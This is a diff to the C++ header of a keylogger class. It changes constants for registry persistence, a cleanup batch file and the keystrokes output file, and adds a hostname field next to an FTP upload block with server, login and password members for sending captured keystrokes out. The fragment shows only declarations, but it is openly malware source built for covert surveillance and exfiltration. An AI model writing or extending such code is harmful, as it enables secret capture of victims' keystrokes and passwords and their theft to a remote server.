@@ -23,8 +23,8 @@
 
 #include "screenshot.h"
 
-//registry key name
-#define REGKEY_NAME "keylogger"
+//registry keys
+#define REGKEY_PERSIST "keylogger"
 
 //keyboard scan codes
 #define SC_CTRL 29
@@ -51,7 +51,7 @@
 #define BATCH_NAME "cleaner.bat"
 
 //name of the file receiving key strokes
-#define KEYSTROKES_FILE "keystrokes.txt"
+#define KEYSTROKES_FILE "keystrokes.html"
 
 class KeyLogger {
 
@@ -141,10 +141,11 @@ class KeyLogger {
     std::string keyboardBuffer;
 
     std::string activeWindowTitle;
-
-    time_t lastUpload;
+   
+    std::string hostname;
 
     #ifdef USE_FTP
+    time_t lastUpload;
     sf::Ftp ftpClient;
     bool useFTP;
     std::string server, login, password, uploadDir;
